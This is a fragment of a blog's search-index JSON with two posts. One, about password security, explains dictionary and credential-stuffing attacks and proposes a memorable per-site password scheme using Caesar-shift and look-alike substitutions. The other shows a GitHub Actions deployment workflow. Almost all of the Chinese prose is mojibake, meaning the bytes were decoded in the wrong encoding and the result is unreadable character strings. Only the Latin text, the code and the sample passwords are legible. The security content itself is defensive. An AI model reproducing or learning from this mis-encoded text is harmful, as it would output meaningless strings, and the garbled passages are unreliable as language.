è¿™é‡Œå°±åˆ©ç”¨äº†äººä»¬ä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œæ€»æ˜¯ä½¿ç”¨ä¸ä¸ªäººä¿¡æ¯ç›¸å…³çš„å£ä»¤è¿™ä¸€ç°è±¡ã€‚ä¸ªäººä¿¡æ¯æ³„éœ²åœ¨è¿™ä¸ªæ—¶ä»£å·²ç»æ˜¯å®¶å¸¸ä¾¿é¥­ï¼Œå› æ­¤é€šè¿‡ä¸€äº›ä¿¡æ¯æ”¶é›†æ‰‹æ®µï¼Œä»æŸä¸€ä¸ªäººçš„ä¸€ä¸ªè™šæ‹Ÿè´¦å·æŸ¥åˆ°å…¶çœŸå®èº«ä»½åŠä¸ªäººä¿¡æ¯å¹¶ééš¾äº‹ã€‚è¿™ç§æ‰‹æ®µè¢«ç§°ä¸ºç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè€Œè¢«æ”»å‡»è€…çš„å£ä»¤å¾ˆæœ‰å¯èƒ½å°±åœ¨ç”±æ­¤å®šåˆ¶å‡ºæ¥çš„å­—å…¸ä¸­ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:1:1","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"é˜²å¾¡ é‚£ä¹ˆä½œä¸ºé˜²å¾¡è€…ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘çš„ä¹Ÿå°±æ˜¯å¦‚ä½•æŠµæŠ—è¿™ä¸¤ç§æ”»å‡»ã€‚æŠµæŠ—æš´åŠ›ç ´è§£éå¸¸å®¹æ˜“ï¼š å£ä»¤å°½å¯èƒ½åŒ…å«å¤§å†™å­—æ¯ã€å°å†™å­—æ¯ã€ç‰¹æ®Šç¬¦å·ã€æ•°å­—ä¸­çš„è‡³å°‘ 3 ç§ å£ä»¤é•¿åº¦ä¸èƒ½å¤ªçŸ­ï¼Œä¸€èˆ¬è‡³å°‘éœ€è¦åœ¨ 8 ä½ä»¥ä¸Š æˆ‘ä»¬ä¸å¦¨ç§°æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶çš„å£ä»¤ä¸ºçˆ†ç ´å®‰å…¨çš„ã€‚ ç„¶è€Œå­—å…¸æ”»å‡»å°±æ²¡é‚£ä¹ˆå®¹æ˜“é˜²äº†ï¼Œå› ä¸ºå®‰å…¨æ˜¯æ–¹ä¾¿çš„æ•Œäººï¼šä¸ä¸ªäººä¿¡æ¯ç›¸å…³çš„å£ä»¤å®¹æ˜“è®°ä½ï¼Œå´ä¹Ÿå®¹æ˜“è¢«å­—å…¸æ”»å‡»ç ´è§£ï¼›ä¸ä¸ªäººä¿¡æ¯æ— å…³çš„ã€æ¯«æ— è§„å¾‹çš„å¤æ‚å£ä»¤å¾ˆéš¾è¢«å­—å…¸æ”»å‡»ç ´è§£ï¼Œä½†å´å¾ˆéš¾è®°ã€‚è¿™ä¸€çŸ›ç›¾åœ¨æ’åº“æ”»å‡»ä¸‹æ›´ä¸ºçªå‡ºã€‚ æ’åº“æ”»å‡»ï¼Œå³æ”»å‡»è€…è·å–åˆ°æŸäººåœ¨æŸä¸€ç½‘ç«™ä¸Šçš„å£ä»¤ï¼ˆæ˜æ–‡ï¼‰åï¼Œç”¨åŒæ ·çš„å£ä»¤å°è¯•ç™»å½•åŒä¸€äººåœ¨å…¶å®ƒç½‘ç«™ä¸Šçš„è´¦å·çš„æ”»å‡»æ‰‹æ®µã€‚ è¿™ç§æ”»å‡»çš„å­˜åœ¨æé†’æˆ‘ä»¬ï¼š å¯¹äºä¸åŒçš„ç½‘ç«™è´¦å·åº”è®¾ç½®ä¸åŒçš„å£ä»¤ï¼Œä¸”æ¯ä¸ªå£ä»¤éƒ½éœ€è¦æ˜¯çˆ†ç ´å®‰å…¨çš„ æ»¡è¶³è¿™æ ·çš„å®‰å…¨æ€§è¦æ±‚ï¼Œå¯èƒ½ä¼šä½¿ä¸€ä¸ªäººçš„å£ä»¤éå¸¸éš¾ä»¥è®°å¿†å’Œç®¡ç†ã€‚å› æ­¤ï¼Œè®¸å¤šäººå¼€å§‹é€‰æ‹©ä½¿ç”¨å£ä»¤ç®¡ç†å·¥å…·æ¥å­˜å‚¨å’Œè‡ªåŠ¨å¡«å……é‚£äº›è®¾ç½®å¾—ååˆ†å¤æ‚çš„å£ä»¤ã€‚è¿™æ˜¯ä¸€ç§ä¸é”™çš„åŠæ³•ï¼Œç„¶è€Œç”±äºå¯¹ä¸€äº›å£ä»¤ç®¡ç†å·¥å…·å®‰å…¨æ€§çš„æ‹…å¿§ã€ä»¥åŠåœ¨å¤šä¸ªå¹³å°ä¸Šè£…åŒä¸€æ¬¾è½¯ä»¶çš„æŠµè§¦ï¼Œæˆ‘ä¾ç„¶å€¾å‘äºä¾èµ–è‡ªå·±å°å°çš„ç°è‰²ç»†èƒã€‚ä¸‹é¢è¦ä»‹ç»çš„ï¼Œå°±æ˜¯å¦‚ä½•è®¾è®¡ä¸€å¥—æ—¢ä¾¿äºè®°å¿†ã€åˆè¶³å¤Ÿå®‰å…¨çš„å£ä»¤æ–¹æ¡ˆã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:1:2","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"éœ€æ±‚ åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬è®¾è®¡æ–¹æ¡ˆçš„éœ€æ±‚ï¼š å¯¹äºä»»æ„ä¸¤ä¸ªä¸åŒçš„ç½‘ç«™ï¼Œæ–¹æ¡ˆäº§ç”Ÿçš„ä¸¤ä¸ªå£ä»¤ç›¸åŒçš„æ¦‚ç‡æ˜¯å¯å¿½ç•¥çš„ å¯¹äºä»»æ„ä¸€ä¸ªç‰¹å®šçš„ç½‘ç«™ï¼Œåœ¨æ²¡æœ‰çº¸ç¬”ã€è®¡ç®—å™¨ç­‰ä»»ä½•è¾…åŠ©å·¥å…·çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨è¾ƒçŸ­æ—¶é—´å†…ï¼ˆä¾‹ï¼š10 ç§’å†…ï¼‰å¾—åˆ°å®Œæ•´çš„å£ä»¤ æ‰€æœ‰äº§ç”Ÿçš„å£ä»¤éƒ½æ˜¯çˆ†ç ´å®‰å…¨çš„ å®é™…ä¸Šå¯¹äº â€œå¯å¿½ç•¥â€ã€â€œè¾ƒçŸ­æ—¶é—´â€ éƒ½å¯ä»¥è¿›è¡Œæ•°å­¦å®šä¹‰ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:2:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ–¹æ¡ˆè®¾è®¡ ä»¥ç”Ÿäº 1975 å¹´ 6 æœˆ 2 æ—¥çš„å¼ ä¸‰ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¦‚ä½•ä¸ºä»–è®¾è®¡ä¸€å¥—å£ä»¤æ–¹æ¡ˆå‘¢ï¼Ÿ ","date":"2020-07-17","objectID":"/shred-dict/:3:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"ä¸å¯å˜éƒ¨åˆ† ä»æœ€ç®€å•æ˜“è®°çš„åå­— + ç”Ÿæ—¥æ–¹å¼ï¼ˆä¹Ÿæ˜¯å¾ˆå¤šäººåœ¨ç”¨çš„æ–¹å¼ï¼‰å¼€å§‹ï¼Œæˆ‘ä»¬é¦–å…ˆè·å¾—äº†åŸºç¡€å£ä»¤ï¼š ZS19750602 è¿™æ ·çš„å£ä»¤æ˜¾ç„¶å¤ªå¼±äº†ã€‚æˆ‘ä»¬å¯ä»¥å¯¹å…¶åº”ç”¨é€‚å½“çš„å˜æ¢ï¼Œä¾‹å¦‚ç”¨ k=6 çš„å‡¯æ’’ç§»ä½ï¼š `Y7?=;6\u003c68 å…·ä½“åº”ç”¨å“ªç§å˜æ¢ï¼Œå–å†³äºå¼ ä¸‰çš„è„‘æ´ã€ä»¥åŠä»€ä¹ˆæ ·çš„å˜æ¢æ–¹å¼å¯¹å¼ ä¸‰æ¥è¯´æ¯”è¾ƒå®¹æ˜“è®¡ç®—ã€‚æ¯”å¦‚ï¼Œä»–åŒæ ·å¯ä»¥ç”¨ä¸€ç§è§„å¾‹æ¯”è¾ƒæ‚çš„å˜æ¢å¾—åˆ°ï¼š 52I6_\\2O905 è¿™é‡Œæ¶‰åŠåˆ°å°†å­—ç¬¦å‚ç›´ç¿»è½¬ã€ä»¥åŠä¸€äº›å½¢çŠ¶ç›¸è¿‘å­—ç¬¦çš„äº’æ¢ç­‰æ“ä½œã€‚è¿™æ¬¡ç”Ÿæˆçš„å­—ç¬¦ä¸²å’ŒåŸå­—ç¬¦ä¸²é•¿åº¦ä¹Ÿä¸ç›¸åŒã€‚ æ€»ä¹‹ï¼Œé€šè¿‡å°†å®¹æ˜“è®°å¿†çš„ï¼ˆä¸ä¸ªäººä¿¡æ¯ç›¸å…³çš„ï¼‰å­—ç¬¦ä¸²è¿›è¡Œä¸€ç§å®¹æ˜“è®¡ç®—çš„å˜æ¢ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾ç”Ÿæˆå£ä»¤çš„ä¸å¯å˜éƒ¨åˆ†ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:3:1","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å¯å˜éƒ¨åˆ† è€Œå¯å˜éƒ¨åˆ†å–å†³äºè¯¥å£ä»¤æ‰€å±çš„å…·ä½“ç½‘ç«™ã€‚ä»¥ QQ ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼ qq / icq / imqq ç­‰ä½œä¸ºç½‘ç«™çš„ç‰¹å¾ã€‚éšåå¯¹ç½‘ç«™ç‰¹å¾è¿›è¡Œå˜æ¢ï¼Œä¾‹å¦‚ qq å¯ä»¥å˜æ¢ä¸º 9g / 11371 / 1wwa ç­‰ï¼ˆåˆ†åˆ«ç”¨äº†å½¢ä¼¼å­—æ›¿æ¢ã€ASCIIã€é”®ç›˜ç­‰è§„å¾‹è¿›è¡Œå˜æ¢ï¼‰ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºåŒæ ·çš„å­—ç¬¦ q åº”è¯¥å˜æ¢å‡ºä¸åŒçš„ç»“æœï¼Œå¹¶ä¸”è¿™é‡Œçš„å˜æ¢æ–¹å¼ä¸åº”ä¸ä¸å¯å˜éƒ¨åˆ†çš„å˜æ¢æ–¹å¼ç›¸åŒã€‚ è¿™æ ·ï¼Œé€šè¿‡æå–ç½‘ç«™ç‰¹å¾å¹¶è¿›è¡Œå¦ä¸€ç§å®¹æ˜“è®¡ç®—çš„å˜æ¢ï¼Œæˆ‘ä»¬å¾—åˆ°äº†å£ä»¤çš„å¯å˜éƒ¨åˆ†ã€‚ é‚£ä¹ˆå¼ ä¸‰æœ€ç»ˆçš„ QQ å£ä»¤å°±å¯ä»¥æ˜¯ï¼š1wwa52I6_\\2O905ã€‚å½“ç„¶è¿˜å¯ä»¥åŠ ä¸€äº›è¿æ¥ç¬¦ï¼Œå¦‚ 1wwa\u002652I6_\\2O905ã€‚ ç”±äºåœ¨ä¸Šè¿°æ­¥éª¤ä¸­ï¼Œé‡‡ç”¨çš„å˜æ¢ã€ç½‘ç«™ç‰¹å¾ã€åŸå­—ç¬¦ä¸²éƒ½éœ€è¦é€‰å–å®¹æ˜“è®°å¿†çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿è¯¥å£ä»¤æ–¹æ¡ˆä¹Ÿæ˜¯å®¹æ˜“è®°å¿†çš„ã€‚é—®é¢˜æ˜¯ï¼Œè¿™æ ·çš„æ–¹æ¡ˆè¶³å¤Ÿå®‰å…¨å—ï¼Ÿ ","date":"2020-07-17","objectID":"/shred-dict/:3:2","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å®‰å…¨æ€§åˆ†æ ä»å¯†ç å­¦è§’åº¦ï¼Œè¿™æ ·çš„æ–¹æ¡ˆæ˜¯ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå…¶æ ¸å¿ƒå°±æ˜¯ * Security through Obsecurity*ï¼Œè¿™æ˜¯è¿å Kerckhoff å‡†åˆ™çš„ã€‚è€Œä¸”ï¼Œè¿™æ ·çš„æ–¹æ¡ˆç¼ºä¹éšæœºæ€§ï¼Œä¸å¯èƒ½æ˜¯å®‰å…¨çš„ã€‚ç„¶è€Œéšæœºæ€§æ°æ°æ˜¯è®°å¿†çš„æœ€å¤§æ•Œäººï¼Œè¿™ä½¿å¾—æˆ‘ä»¬ä¸èƒ½åœ¨æ–¹æ¡ˆä¸­å¼•å…¥éšæœºæ€§ã€‚ ä¸è¿‡å¯¹äºä¸ªäººä½¿ç”¨è€Œè¨€ï¼Œå¯ä»¥è®¤ä¸ºè¯¥æ–¹æ¡ˆè¶³å¤Ÿå®‰å…¨ã€‚åœ¨åˆ†ææ–¹æ¡ˆå®‰å…¨æ€§ä¹‹å‰ï¼Œæˆ‘ä»¬ä¸å¦¨å…ˆè®¨è®ºä¸€äº›å®‰å…¨çš„å®šä¹‰ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:4:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å®šä¹‰ ä¸ºäº†å®šä¹‰ä¸€ç§å£ä»¤æ–¹æ¡ˆ â€œæœ‰å¤šå®‰å…¨â€ï¼Œæˆ‘ä»¬å¯ä»¥ç«™åœ¨æ”»å‡»è€…çš„è§’åº¦ï¼šæ”»å‡»è€…ä¸ºäº†è·å–å£ä»¤æ‰€éœ€è¦ä»˜å‡ºçš„ä»£ä»·è¶Šå¤§ï¼Œé‚£ä¹ˆå¯ä»¥è¯´è¿™ç§å£ä»¤æ–¹æ¡ˆè¶Šå®‰å…¨ã€‚ä¸å¦¨ç§°æ”»å‡»è€…ä¸º Aï¼Œè¢«æ”»å‡»è€…ä¸º Bï¼Œä¸‹é¢å°±ç»™å‡ºä¸€äº›æ”»å‡»è€…å…·å¤‡ä¸åŒèƒ½åŠ›æ—¶çš„åœºæ™¯ï¼š å¼±ç¤¾å·¥æ”»å‡»ï¼šA åªèƒ½è·å–åˆ°å…³äº B çš„ä¸€äº›åŸºæœ¬ç¤¾å·¥ä¿¡æ¯ï¼Œå¦‚å§“åã€ç”Ÿæ—¥ã€è¯ä»¶å·ç ç­‰ï¼Œå°è¯•è·å– B åœ¨éšæœºæŸä¸€ç½‘ç«™ä¸Šçš„å£ä»¤ å¼ºç¤¾å·¥æ”»å‡»ï¼šA æœ‰èƒ½åŠ›è·å–åˆ°ä»»ä½•ä¸ B æœ‰å…³çš„ç¤¾å·¥ä¿¡æ¯çš„æ¯ä¸€ä¸ªç»†èŠ‚ï¼ˆA æ¯”ä»»ä½•ä¸€ä¸ªç†Ÿæ‚‰ B çš„äººæ›´ç†Ÿæ‚‰ Bï¼‰ï¼Œå°è¯•è·å– B åœ¨éšæœºæŸä¸€ç½‘ç«™ä¸Šçš„å£ä»¤ å·²çŸ¥å£ä»¤æ”»å‡»ï¼šä¸Šè¿°åŸºç¡€ä¸Šï¼ŒA æœ‰èƒ½åŠ›è·å– B åœ¨éšæœºæŸä¸€ç½‘ç«™ä¸Šçš„å£ä»¤ï¼Œå°è¯•è·å– B åœ¨æŒ‡å®šç½‘ç«™ä¸Šçš„å£ä»¤ é€‰æ‹©å£ä»¤æ”»å‡»ï¼šä¸Šè¿°åŸºç¡€ä¸Šï¼ŒA æœ‰èƒ½åŠ›è·å– B åœ¨æŒ‡å®šç½‘ç«™ä¸Šçš„å£ä»¤ï¼Œå°è¯•è·å– B æ–°æ³¨å†Œçš„ç½‘ç«™ä¸Šä½¿ç”¨çš„å£ä»¤ ","date":"2020-07-17","objectID":"/shred-dict/:4:1","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"è®¨è®º å¯ä»¥çœ‹åˆ°ï¼Œæ”»å‡»è€…çš„èƒ½åŠ›æ˜¯é€’å¢çš„ã€‚ç”±äºç»è¿‡å˜æ¢ï¼Œå£ä»¤çœ‹èµ·æ¥ä¸ç¤¾å·¥ä¿¡æ¯æ— å…³ï¼Œè¿™è¶³ä»¥ä¿è¯å£ä»¤ä¸ä¼šå‡ºç°åœ¨æ”»å‡»è€…æ„é€ çš„å­—å…¸ä¸­ï¼Œä½¿å¾—å¼ºç¤¾å·¥æ”»å‡»éš¾ä»¥æˆåŠŸï¼›å¯¹äºå·²çŸ¥å£ä»¤æ”»å‡»å’Œé€‰æ‹©å£ä»¤æ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦å¯¹è·å¾—çš„å£ä»¤è¿›è¡Œåˆ†æï¼Œä»¥æŒæ¡å£ä»¤æ–¹æ¡ˆä¸­é‡‡ç”¨çš„ä¸¤ç§å˜æ¢ã€ç½‘ç«™ç‰¹å¾ã€åŸå­—ç¬¦ä¸²â€”â€”â€”â€”åä¸¤è€…ä¸éš¾çŒœè§£ï¼Œè€Œå®‰å…¨æ€§çš„æ ¸å¿ƒï¼Œå³é‡‡ç”¨çš„ä¸¤ç§å˜æ¢å¦‚æœé€‰å–å¾—å½“ï¼Œåœ¨å·²çŸ¥å£ä»¤æ”»å‡»ä¸‹æ˜¯æéš¾çŒœè§£çš„ã€‚è¿™æ˜¯å› ä¸ºå·²çŸ¥å£ä»¤æƒ…æ™¯ä¸‹æ”»å‡»è€…è¿˜éœ€è¦åŒºåˆ†å¯å˜å’Œä¸å¯å˜çš„éƒ¨åˆ†ã€‚ è€Œå¯¹äºé€‰æ‹©å£ä»¤æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°ä¸å¯å˜çš„éƒ¨åˆ†ï¼Œé‚£ä¹ˆæœ€åçš„æŒ‘æˆ˜å°±ä»…ä»…åœ¨äºçŒœè§£ä¸¤ç§å˜æ¢ã€‚æ­¤æ—¶ä¸¤ç§å˜æ¢çš„è®¾è®¡å°±æå¤§ç¨‹åº¦å†³å®šäº†æ–¹æ¡ˆçš„å®‰å…¨æ€§ã€‚ç”±äºæ›´å®‰å…¨å‡ ä¹æ€»æ˜¯æ„å‘³ç€æ›´éš¾ä»¥è®°å¿†ï¼Œè¿™é‡Œçš„è®¾è®¡å¯ä»¥æ ¹æ®ä¸ªäººéœ€è¦æ¥è°ƒæ•´ã€‚å¦‚æœä½¿ç”¨ç±»ä¼¼å‡¯æ’’ç§»ä½è¿™ç§å˜æ¢ï¼Œæƒ³è¦æŠµæŠ—é€‰æ‹©å£ä»¤æ”»å‡»æ˜¯æ¯”è¾ƒå‹‰å¼ºçš„ã€‚ ä¸è¿‡è¯è¯´å›æ¥ï¼Œé€‰æ‹©å£ä»¤æ”»å‡»ç¡®å®æ˜¯æç«¯çš„æƒ…æ™¯â€”â€”â€”â€”å› ä¸ºæ­¤æ—¶æ”»å‡»è€…å¿…é¡»è¦æŒæ¡ä½ æ‰€æœ‰ç½‘ç«™ä¸Šçš„å£ä»¤æ‰è¡Œã€‚ç°å®ä¸­çš„æ’åº“æ”»å‡»ä¸€èˆ¬æ›´æ¥è¿‘å·²çŸ¥å£ä»¤æ”»å‡»ï¼Œè€Œæˆ‘ä»¬çš„æ–¹æ¡ˆå¯ä»¥å¾ˆå¥½åœ°æŠµå¾¡è¿™ç±»æ”»å‡»æƒ…æ™¯ã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:4:2","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ€»ç»“ æˆ‘ä»¬å¯ä»¥è¿™æ ·è®¾è®¡æ—¢å®¹æ˜“è®°å¿†ã€åˆèƒ½æŠµæŠ—å¸¸è§„æƒ…æ™¯ä¸‹å­—å…¸æ”»å‡»çš„å£ä»¤æ–¹æ¡ˆï¼šå˜æ¢ 1(ç½‘ç«™ç‰¹å¾) || [è¿æ¥ç¬¦] || å˜æ¢ 2(å¯èƒ½ä¸ä¸ªäººä¿¡æ¯ç›¸å…³çš„å­—ç¬¦ä¸²)ï¼›è¿™ç§æ–¹æ¡ˆæœ¬è´¨ä¸Šæ˜¯ä¸€ç§å°† å¯èƒ½ä¸ä¸ªäººä¿¡æ¯ç›¸å…³çš„å­—ç¬¦ä¸² è¿™ç±»å¼±å£ä»¤ä¸ ç½‘ç«™ç‰¹å¾ å…³è”ä»è€Œç”ŸæˆåŠ¨æ€å¼ºå£ä»¤çš„æ–¹æ¡ˆã€‚ ","date":"2020-07-17","objectID":"/shred-dict/:5:0","tags":["è®¤è¯"],"title":"ç²‰ç¢å­—å…¸ï¼šè®¾è®¡æ–¹ä¾¿è®°å¿†çš„å®‰å…¨å£ä»¤","uri":"/shred-dict/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æœ€è¿‘åœ¨æ SDLï¼Œå°è¯•äº†ä¸€ä¸‹ CI/CD ã€‚ ","date":"2020-07-16","objectID":"/github-actions-cd/:0:0","tags":["CI/CD"],"title":"é—»é¸¡èµ·èˆï¼šåˆ©ç”¨ GitHub Actions è¿›è¡ŒæŒç»­éƒ¨ç½²","uri":"/github-actions-cd/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"èƒŒæ™¯ åœ¨å¼€å‘ pAssWD çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°æ¯æ¬¡å¼€å‘åˆ°ä¸€ä¸ªé˜¶æ®µï¼Œéœ€è¦ç»™åˆ«äººå±•ç¤ºæ•ˆæœçš„æ—¶å€™ï¼Œæ€»æ˜¯éœ€è¦ç»è¿‡å‡ ä¸ªä¸ç®—å¤ªéº»çƒ¦ä½†æ˜¯å›ºå®šçš„æ­¥éª¤ï¼š è¿è¡Œ npm run build å°†æœåŠ¡å™¨ä¸ŠåŸæ¥çš„ spa æ–‡ä»¶å¤¹åˆ é™¤ æŠŠ dist/spa ç›®å½•é€šè¿‡ SFTP ä¸Šä¼ åˆ°æœåŠ¡å™¨ åœ¨ spa ç›®å½•ä¸‹èµ·ä¸€ä¸ª http æœåŠ¡ è¿™äº›æ­¥éª¤è¿å¯å˜çš„å‚æ•°éƒ½æ²¡æœ‰ï¼Œéå¸¸é€‚åˆè‡ªåŠ¨åŒ–ã€‚æ°å¥½æœ€è¿‘å®ä¹ æ—¶çš„ SDL é¡¹ç›®ä¹Ÿéœ€è¦æˆ‘å¯¹ CI/CD æœ‰æ‰€äº†è§£ï¼Œäºæ˜¯æˆ‘ä» pAssWD é¡¹ç›®å¼€å§‹ç€æ‰‹å®æ–½ CI/CD æµç¨‹ã€‚ ","date":"2020-07-16","objectID":"/github-actions-cd/:1:0","tags":["CI/CD"],"title":"é—»é¸¡èµ·èˆï¼šåˆ©ç”¨ GitHub Actions è¿›è¡ŒæŒç»­éƒ¨ç½²","uri":"/github-actions-cd/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"Github Actions æˆ‘å¬è¯´äº†ä¸å°‘æŒç»­é›†æˆå·¥å…·ï¼Œå¦‚ Jenkins, Travis ç­‰ï¼Œä½†ç”±äºä»£ç æ”¾åœ¨ GitHub ä¸Šï¼Œè€ƒè™‘åˆ°å¯ä»¥å’Œ GitHub Pages è”åŠ¨ï¼Œæˆ‘é€‰æ‹©äº† GitHub Actions æ¥å®ç°ã€‚ GitHub Actions éå¸¸å‹å¥½çš„ä¸€ç‚¹åœ¨äºï¼Œå¯ä»¥ç›´æ¥æŠŠ GitHub ä¸Šå…¶ä»–å¼€å‘è€…ç¼–å†™å¥½çš„ actions æ‹¿æ¥ç”¨ï¼Œå¹¶ä¸” actions ç”¨åˆ°çš„ workflow æ–‡ä»¶æ˜¯ä¼˜é›…çš„ yaml æ ¼å¼ï¼Œå¯ä»¥è¯´å¯¹æˆ‘è¿™ç§æ–°æ‰‹æ¥è¯´éå¸¸å®¹æ˜“å…¥é—¨ã€‚ é¦–å…ˆåˆ›å»º .github/workflow/ ç›®å½•ç”¨æ¥å­˜æ”¾ä¸åŒçš„ workflow æ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘ä»¬æ–°å»ºä¸€ä¸ª build.yamlï¼š name:buildon:push:branches:[master]pull_request:branches:[master] name å³è¯¥ workflow çš„åç§°ï¼Œon è¡¨ç¤ºä»€ä¹ˆæ—¶å€™è§¦å‘ Actionsï¼Œåœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰å¯¹ master åˆ†æ”¯è¿›è¡Œ push æˆ–è€… PR çš„æ—¶å€™æ‰ä¼šè§¦å‘ Actionsã€‚ jobs:build-and-deploy:runs-on:ubuntu-lateststeps:# Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it- name:Checkoutuses:actions/checkout@v2# Runs a single command using the runners shell- name:Build and Deployuses:JamesIves/github-pages-deploy-action@masterenv:ACCESS_TOKEN:${{secrets.ACCESS_TOKEN}}BRANCH:gh-pagesFOLDER:dist/spaBUILD_SCRIPT:npm install \u0026\u0026 npm run build æ¥ä¸‹æ¥å®šä¹‰ jobsï¼Œè¿™é‡Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ª job ä¹Ÿå°±æ˜¯ build-and-deployã€‚å¯¹äºè¿™ä¸ª jobï¼Œæˆ‘ä»¬é¦–å…ˆåˆ†é…ä¸€ä¸ª runnerï¼Œå³è¿è¡Œè¿™äº› Actions çš„è™šæ‹Ÿæœºã€‚è¿™äº›è™šæ‹Ÿæœºæ˜¯ GitHub æ‰˜ç®¡çš„ï¼Œå½“ç„¶æ ¹æ®æ–‡æ¡£ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±çš„ runnerã€‚è¿™é‡Œé€‰æ‹©äº†æœ€æ–°çš„ ubuntu ç³»ç»Ÿã€‚ ç„¶åå®šä¹‰è¦åšçš„ä¸€ç³»åˆ—æ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤éƒ½å¯ä»¥æœ‰è‡ªå·±çš„ nameã€‚ç¬¬ä¸€æ­¥ä¸€èˆ¬å…ˆè¦ checkout åˆ°è‡ªå·±çš„è¿™ä¸ª repo ä¸‹ï¼Œæˆ‘ä»¬ä¸ç”¨å…³å¿ƒå…·ä½“æ˜¯æ€ä¹ˆ checkout çš„ï¼Œå› ä¸ºæœ‰ actions/checkout@v2 å¸®æˆ‘ä»¬ç®¡ç†äº†è¿™äº›æ­¥éª¤ã€‚åŒæ ·çš„ï¼Œç¬¬äºŒæ­¥æˆ‘ä»¬åœ¨éƒ¨ç½²åˆ° Pages æ—¶åŒæ ·æ— éœ€å…³å¿ƒç»†èŠ‚ï¼Œç›´æ¥ä½¿ç”¨äº†ä¸€ä¸ªéƒ¨ç½²åˆ° Pages çš„ actionã€‚ è¿™é‡Œéœ€è¦é…ç½®ä¸€äº›å‚æ•°ï¼Œé¦–å…ˆæ˜¯ä¸ªäººçš„ GitHub Tokenï¼Œåœ¨ Settings-\u003eDeveloper Settings ä¸­å¯ä»¥ç”Ÿæˆã€‚è¿™æ˜¯å› ä¸ºåœ¨æˆ‘ä»¬ç”¨çš„è¿™ä¸ª action ä¸­éœ€è¦è°ƒç”¨ GitHub çš„ APIï¼Œå› æ­¤éœ€è¦ä¸€ä¸ªè®¤è¯ tokenã€‚æ³¨æ„è¯¥ token éœ€è¦ä¿å¯†ï¼Œå› æ­¤æ”¾åœ¨é¡¹ç›®çš„ Settings-\u003eSecrets é‡Œã€‚ç„¶åæ˜¯è¦éƒ¨ç½²çš„åˆ†æ”¯ã€éƒ¨ç½²æ–‡ä»¶çš„ç›®å½•ã€æ„å»ºæ—¶è¦æ‰§è¡Œçš„å‘½ä»¤ç­‰ï¼Œéƒ½å¾ˆå®¹æ˜“ç†è§£ã€‚ è‡³æ­¤ï¼Œbuild.yaml å†™å®Œäº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯• push ä¸€ä¸‹ï¼Œç„¶ååœ¨ Actions é¡µé¢å°±èƒ½çœ‹åˆ°å·²ç»è‡ªåŠ¨è¿è¡Œçš„ build æµç¨‹äº†ã€‚ å›¾ 1ï½œActions é¡µé¢ \" 